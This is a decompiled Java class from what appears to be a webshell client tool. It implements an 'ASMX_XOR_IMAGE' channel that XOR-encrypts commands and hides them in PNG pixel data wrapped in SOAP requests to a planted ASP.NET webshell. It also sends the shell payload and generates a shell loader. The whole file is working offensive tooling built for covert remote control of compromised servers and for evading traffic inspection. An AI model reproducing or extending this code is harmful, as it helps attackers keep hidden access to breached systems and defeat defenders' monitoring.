//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.cryptions.csharpAes;

import core.annotation.CryptionAnnotation;
import core.imp.Cryption;
import core.shell.ShellEntity;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Arrays;
import java.util.Random;
import javax.imageio.ImageIO;
import shells.channel.HttpRequestChannel;
import shells.channel.RequestChannel;
import util.Log;
import util.functions;

@CryptionAnnotation(
    Name = "ASMX_XOR_IMAGE",
    payloadName = "CSharpDynamicPayload"
)
public class CSharpAsmxXorImage implements Cryption {
    private ShellEntity shell;
    private RequestChannel request;
    private String key;
    private boolean state;
    private byte[] payload;
    private byte[] findStrLeft;
    private String pass;
    private byte[] findStrRight;
    private String xmlRequest;
    private String suffix = "asmx";

    public CSharpAsmxXorImage() {
    }

    public void init(ShellEntity context) {
        this.shell = context;
        this.request = new HttpRequestChannel(context);
        context.setRequest(this.request);
        this.key = this.shell.getSecretKeyX();
        this.pass = this.shell.getPassword();
        this.findStrLeft = ("<" + this.pass + "Result>").getBytes();
        this.findStrRight = ("</" + this.pass + "Result>").getBytes();
        this.shell.putHeader("Content-Type", "text/xml; charset=utf-8");
        if (!this.shell.getHeaders().containsKey("SOAPAction")) {
            this.shell.putHeader("SOAPAction", "\"http://tempuri.org/" + this.pass + "\"");
        }

        this.xmlRequest = readXmlRequest(this.pass);

        try {
            this.payload = this.shell.getPayloadModule().getPayload();
            if (this.payload != null) {
                this.request.sendRequest(this.payload);
                this.state = true;
            } else {
                Log.error("payload Is Null");
            }
        } catch (Exception var3) {
            Log.error(var3);
        }

    }

    public synchronized byte[] encode(byte[] data) {
        try {
            return this.xmlRequest.replace("{data}", new String(this.encryptToBase64(data))).getBytes();
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public synchronized byte[] decode(byte[] data) {
        try {
            data = this.decryptFromBase64(data);
            return data;
        } catch (Exception var3) {
            Log.error(var3);
            return null;
        }
    }

    public byte[] encryptToBase64(byte[] bytes) throws IOException {
        byte[] keyBytes = this.key.getBytes();
        byte[] suffix = new byte[]{-1, -120, 0};
        byte[] encodedBytes = new byte[bytes.length + suffix.length];
        System.arraycopy(bytes, 0, encodedBytes, 0, bytes.length);
        System.arraycopy(suffix, 0, encodedBytes, bytes.length, suffix.length);
        int remaining = encodedBytes.length % 3;
        if (remaining != 0) {
            byte[] padding = new byte[3 - remaining];
            (new Random()).nextBytes(padding);
            encodedBytes = Arrays.copyOf(encodedBytes, encodedBytes.length + padding.length);
            System.arraycopy(padding, 0, encodedBytes, encodedBytes.length - padding.length, padding.length);
        }

        int width;
        for(width = 0; width < encodedBytes.length; ++width) {
            encodedBytes[width] ^= keyBytes[width % keyBytes.length];
        }

        width = (int)Math.ceil(Math.sqrt((double)(encodedBytes.length / 3)));
        int height = (int)Math.ceil((double)encodedBytes.length / (double)(width * 3));
        BufferedImage image = new BufferedImage(width, height, 1);
        int index = 0;

        for(int y = 0; y < height; ++y) {
            for(int x = 0; x < width && index < encodedBytes.length; ++x) {
                int r = encodedBytes[index++] & 255;
                int g = index < encodedBytes.length ? encodedBytes[index++] & 255 : 0;
                int b = index < encodedBytes.length ? encodedBytes[index++] & 255 : 0;
                int rgb = r << 16 | g << 8 | b;
                image.setRGB(x, y, rgb);
            }
        }

        ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
        ImageIO.write(image, "png", outputStream);
        String base64String = "data:image/png;base64," + functions.base64EncodeToString(outputStream.toByteArray());
        return base64String.getBytes();
    }

    public byte[] decryptFromBase64(byte[] base64StringBytes) throws IOException {
        String base64String = new String(base64StringBytes);
        String base64Data = base64String;
        if (base64String.contains(",")) {
            base64Data = base64String.split(",")[1];
        }

        byte[] imageBytes = functions.base64Decode(base64Data);
        byte[] keyBytes = this.key.getBytes();
        BufferedImage image = ImageIO.read(new ByteArrayInputStream(imageBytes));
        int width = image.getWidth();
        int height = image.getHeight();
        byte[] encodedBytes = new byte[width * height * 3];
        int index = 0;

        int suffixIndex;
        for(suffixIndex = 0; suffixIndex < height; ++suffixIndex) {
            for(int x = 0; x < width; ++x) {
                int rgb = image.getRGB(x, suffixIndex);
                encodedBytes[index++] = (byte)(rgb >> 16 & 255);
                encodedBytes[index++] = (byte)(rgb >> 8 & 255);
                encodedBytes[index++] = (byte)(rgb & 255);
            }
        }

        for(suffixIndex = 0; suffixIndex < encodedBytes.length; ++suffixIndex) {
            encodedBytes[suffixIndex] ^= keyBytes[suffixIndex % keyBytes.length];
        }

        for(suffixIndex = encodedBytes.length - 1; suffixIndex >= 2 && (encodedBytes[suffixIndex] != 0 || encodedBytes[suffixIndex - 1] != -120 || encodedBytes[suffixIndex - 2] != -1); --suffixIndex) {
        }

        if (suffixIndex < 2) {
            throw new IllegalArgumentException("Invalid encoded bytes");
        } else {
            return Arrays.copyOf(encodedBytes, suffixIndex - 2);
        }
    }

    public byte[] findStr(byte[] respResult) {
        byte[] str = functions.subMiddleBytes(respResult, this.findStrLeft, this.findStrRight);
        return str != null ? str : functions.subMiddleBytes(respResult, "\">".getBytes(), "</return>".getBytes());
    }

    public boolean isSendRLData() {
        return false;
    }

    public boolean check() {
        return this.state;
    }

    public String getSuffix() {
        return this.suffix;
    }

    public byte[] generate(String password, String secretKey) {
        return Generate.GenerateShellLoder("ImageAsmx.bin", "asmx", password, secretKey);
    }

    private static String readXmlRequest(String pass) {
        byte[] data = new byte[0];

        try {
            InputStream inputStream = CSharpAsmxAesBase64.class.getResourceAsStream("template/asmxRequest.bin");
            data = functions.readInputStream(inputStream);
        } catch (Exception var3) {
            Log.error(var3);
        }

        return (new String(data)).replace("{pass}", pass);
    }
}
